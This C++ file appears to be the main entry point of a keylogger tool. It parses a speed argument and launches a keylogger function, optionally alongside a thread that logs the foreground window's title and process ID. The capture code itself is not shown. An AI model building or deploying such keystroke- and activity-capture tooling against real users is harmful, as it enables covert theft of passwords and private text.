#include "common.h"
#include "processInfo.h"
#include "keylog.h"

int parseIntegerArgument(const std::string& arg) {  // & symbol in const std::string& arg indicates that arg is a reference to a const std::string
    try {
        return std::stoi(arg);
    }
    catch (const std::invalid_argument&) {
        std::cout << "Invalid argument: " << arg << ". Please input an integer." << std::endl;
        exit(1);
    }
    catch (const std::out_of_range&) {
        std::cout << "Speed out of range: " << arg << std::endl;
        exit(1);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2 || std::string(argv[1]) == "--help" || std::string(argv[1]) == "-h") {
        std::cout << std::endl;
        std::cout << "Usage: " << argv[0] << " <speed>" << std::endl;
        std::cout << "      [-i Displays: Foreground process window bar title along with its PID]" << std::endl;
        std::cout << "      [-i <delay> (In milliseconds): Specifies how often the foreground window bar title prints]" << std::endl;
        return 1;
    }

    int speed = parseIntegerArgument(argv[1]);

    int delay = 15000; // Default delay if no argument is supplied for delay[argv[3]] after the -i argument

    if (argc >= 3 && std::string(argv[2]) == "-i") {
        if (argc >= 4) {
            delay = parseIntegerArgument(argv[3]);
        }
        std::thread thread1(keylogger, speed); // Create a new thread for the keylogger function
        std::thread thread2(processes, delay); // Create a new thread for the processes function
        thread1.join();
        thread2.join();
    }
    else {
        keylogger(speed);
    }

    return 0;
}
